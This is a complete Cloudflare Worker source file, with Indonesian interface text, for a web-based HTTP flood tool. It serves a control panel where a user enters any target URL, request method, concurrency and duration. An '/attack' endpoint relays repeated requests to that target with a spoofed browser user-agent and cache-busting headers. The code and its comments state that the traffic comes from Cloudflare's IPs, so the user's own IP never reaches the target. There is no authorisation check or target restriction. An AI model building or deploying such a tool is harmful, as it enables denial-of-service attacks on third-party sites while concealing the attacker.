/**
 * HTTP Flood Control - Cloudflare Worker
 * Request keluar dari edge CF, IP user tidak sampai ke target
 */

const HTML = `<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
<title>HTTP Flood Control</title>
<style>
:root {
  --bg: #070b14;
  --card: #0f1623;
  --border: #1c2738;
  --accent: #3b82f6;
  --accent2: #2563eb;
  --text: #f1f5f9;
  --muted: #94a3b8;
  --ok: #22c55e;
  --err: #ef4444;
  --warn: #f59e0b;
}
* { box-sizing: border-box; margin: 0; padding: 0; }
body {
  font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
  background: var(--bg);
  color: var(--text);
  min-height: 100vh;
  padding: 20px;
  display: flex;
  align-items: center;
  justify-content: center;
}
.wrap {
  width: 100%;
  max-width: 680px;
}
.card {
  background: var(--card);
  border: 1px solid var(--border);
  border-radius: 18px;
  padding: 28px 24px;
  box-shadow: 0 20px 40px rgba(0,0,0,.45);
}
h1 {
  font-size: 1.6rem;
  font-weight: 700;
  letter-spacing: -0.03em;
  margin-bottom: 6px;
}
.sub {
  color: var(--muted);
  font-size: 0.9rem;
  margin-bottom: 24px;
  line-height: 1.4;
}
label {
  display: block;
  font-size: 0.8rem;
  font-weight: 600;
  color: var(--muted);
  margin-bottom: 6px;
  text-transform: uppercase;
  letter-spacing: 0.04em;
}
input, select {
  width: 100%;
  background: var(--bg);
  border: 1px solid var(--border);
  border-radius: 11px;
  padding: 13px 14px;
  color: var(--text);
  font-size: 0.95rem;
  margin-bottom: 16px;
  transition: border-color .15s;
}
input:focus, select:focus {
  outline: none;
  border-color: var(--accent);
}
.grid3 {
  display: grid;
  grid-template-columns: 1fr 1fr 1fr;
  gap: 12px;
}
.btns {
  display: flex;
  gap: 10px;
  margin-top: 6px;
  margin-bottom: 22px;
}
button {
  flex: 1;
  padding: 14px;
  border: none;
  border-radius: 11px;
  font-size: 0.95rem;
  font-weight: 600;
  cursor: pointer;
  transition: .15s;
}
#btnStart {
  background: var(--accent);
  color: #fff;
}
#btnStart:hover:not(:disabled) { background: var(--accent2); }
#btnStart:disabled { opacity: .45; cursor: not-allowed; }
#btnStop {
  background: transparent;
  border: 1px solid var(--err);
  color: var(--err);
}
#btnStop:hover:not(:disabled) { background: var(--err); color: #fff; }
#btnStop:disabled { opacity: .35; cursor: not-allowed; }
.stats {
  display: grid;
  grid-template-columns: repeat(4, 1fr);
  gap: 10px;
  margin-bottom: 18px;
}
.stat {
  background: var(--bg);
  border: 1px solid var(--border);
  border-radius: 12px;
  padding: 14px 8px;
  text-align: center;
}
.stat b {
  display: block;
  font-size: 1.35rem;
  font-weight: 700;
  margin-bottom: 3px;
}
.stat span {
  font-size: 0.7rem;
  color: var(--muted);
  text-transform: uppercase;
  letter-spacing: 0.05em;
}
.log {
  background: var(--bg);
  border: 1px solid var(--border);
  border-radius: 12px;
  height: 240px;
  overflow-y: auto;
  padding: 12px 14px;
  font-family: ui-monospace, 'Cascadia Code', 'Fira Code', monospace;
  font-size: 0.78rem;
  line-height: 1.55;
}
.log div { margin-bottom: 3px; }
.ok { color: var(--ok); }
.err { color: var(--err); }
.info { color: var(--muted); }
.warn { color: var(--warn); }
.status {
  display: flex;
  align-items: center;
  gap: 8px;
  margin-top: 14px;
  font-size: 0.85rem;
  color: var(--muted);
}
.dot {
  width: 8px; height: 8px;
  border-radius: 50%;
  background: var(--muted);
}
.dot.on {
  background: var(--ok);
  box-shadow: 0 0 8px var(--ok);
  animation: pulse 1.1s infinite;
}
@keyframes pulse {
  0%,100% { opacity: 1; }
  50% { opacity: .35; }
}
@media (max-width: 560px) {
  .grid3 { grid-template-columns: 1fr; }
  .stats { grid-template-columns: 1fr 1fr; }
}
</style>
</head>
<body>
<div class="wrap">
  <div class="card">
    <h1>HTTP Flood Control</h1>
    <p class="sub">Request keluar dari edge Cloudflare.<br>IP kamu tidak sampai ke target.</p>

    <label>Target URL</label>
    <input type="url" id="target" placeholder="https://contoh.com" autocomplete="off">

    <div class="grid3">
      <div>
        <label>Method</label>
        <select id="method">
          <option value="GET">GET</option>
          <option value="POST">POST</option>
          <option value="HEAD">HEAD</option>
        </select>
      </div>
      <div>
        <label>Concurrency</label>
        <input type="number" id="conc" value="30" min="1" max="80">
      </div>
      <div>
        <label>Durasi (detik)</label>
        <input type="number" id="dur" value="15" min="5" max="60">
      </div>
    </div>

    <div class="btns">
      <button id="btnStart">Mulai Flood</button>
      <button id="btnStop" disabled>Stop</button>
    </div>

    <div class="stats">
      <div class="stat"><b id="sSent">0</b><span>Terkirim</span></div>
      <div class="stat"><b id="sOk">0</b><span>Sukses</span></div>
      <div class="stat"><b id="sFail">0</b><span>Gagal</span></div>
      <div class="stat"><b id="sRps">0</b><span>RPS</span></div>
    </div>

    <div class="log" id="log"></div>

    <div class="status">
      <div class="dot" id="dot"></div>
      <span id="stxt">Siap</span>
    </div>
  </div>
</div>

<script>
const $ = id => document.getElementById(id);
let running = false;

function log(msg, cls = 'info') {
  const d = document.createElement('div');
  d.className = cls;
  d.textContent = '[' + new Date().toLocaleTimeString('id-ID', {hour12:false}) + '] ' + msg;
  $('log').appendChild(d);
  $('log').scrollTop = $('log').scrollHeight;
}

function setStatus(on, text) {
  $('dot').classList.toggle('on', on);
  $('stxt').textContent = text;
}

async function start() {
  const url = $('target').value.trim();
  if (!url.startsWith('http')) {
    log('URL harus diawali http:// atau https://', 'err');
    return;
  }

  const method = $('method').value;
  const conc = Math.min(80, Math.max(1, +$('conc').value || 30));
  const dur = Math.min(60, Math.max(5, +$('dur').value || 15));

  running = true;
  $('btnStart').disabled = true;
  $('btnStop').disabled = false;
  $('log').innerHTML = '';
  $('sSent').textContent = 0;
  $('sOk').textContent = 0;
  $('sFail').textContent = 0;
  $('sRps').textContent = 0;

  setStatus(true, 'Flood aktif');
  log('Target: ' + url, 'info');
  log('Method: ' + method + ' | Concurrency: ' + conc + ' | Durasi: ' + dur + 's', 'info');
  log('Request dikirim dari IP Cloudflare (bukan IP kamu)', 'warn');

  const t0 = Date.now();
  const end = t0 + dur * 1000;
  let sent = 0, ok = 0, fail = 0;

  async function one() {
    try {
      const r = await fetch('/attack', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ url, method })
      });
      sent++;
      if (r.status >= 200 && r.status < 500) ok++;
      else fail++;
    } catch {
      sent++;
      fail++;
    }
    $('sSent').textContent = sent;
    $('sOk').textContent = ok;
    $('sFail').textContent = fail;
    const elapsed = (Date.now() - t0) / 1000;
    $('sRps').textContent = elapsed > 0 ? Math.round(sent / elapsed) : 0;
  }

  while (running && Date.now() < end) {
    const batch = [];
    for (let i = 0; i < conc; i++) batch.push(one());
    await Promise.all(batch);
  }

  running = false;
  $('btnStart').disabled = false;
  $('btnStop').disabled = true;
  setStatus(false, 'Selesai');
  log('Selesai → Terkirim: ' + sent + ' | Sukses: ' + ok + ' | Gagal: ' + fail, 'ok');
}

$('btnStart').onclick = start;
$('btnStop').onclick = () => {
  running = false;
  $('btnStart').disabled = false;
  $('btnStop').disabled = true;
  setStatus(false, 'Dihentikan');
  log('Dihentikan manual', 'warn');
};
</script>
</body>
</html>`;

export default {
  async fetch(request, env, ctx) {
    const u = new URL(request.url);

    // UI
    if (request.method === 'GET' && (u.pathname === '/' || u.pathname === '')) {
      return new Response(HTML, {
        headers: {
          'Content-Type': 'text/html;charset=UTF-8',
          'Cache-Control': 'no-store'
        }
      });
    }

    // Attack endpoint
    if (request.method === 'POST' && u.pathname === '/attack') {
      try {
        const body = await request.json();
        const target = (body.url || '').trim();
        const method = (body.method || 'GET').toUpperCase();

        if (!target.startsWith('http')) {
          return new Response(JSON.stringify({ error: 'bad url' }), { status: 400 });
        }

        const ctrl = new AbortController();
        const to = setTimeout(() => ctrl.abort(), 9000);

        const opts = {
          method,
          signal: ctrl.signal,
          redirect: 'follow',
          headers: {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache'
          }
        };

        if (method === 'POST') {
          opts.body = JSON.stringify({ t: Date.now(), n: Math.random() });
          opts.headers['Content-Type'] = 'application/json';
        }

        const res = await fetch(target, opts);
        clearTimeout(to);
        return new Response(null, { status: res.status });
      } catch (e) {
        return new Response(null, { status: 502 });
      }
    }

    return new Response('Not Found', { status: 404 });
  }
};
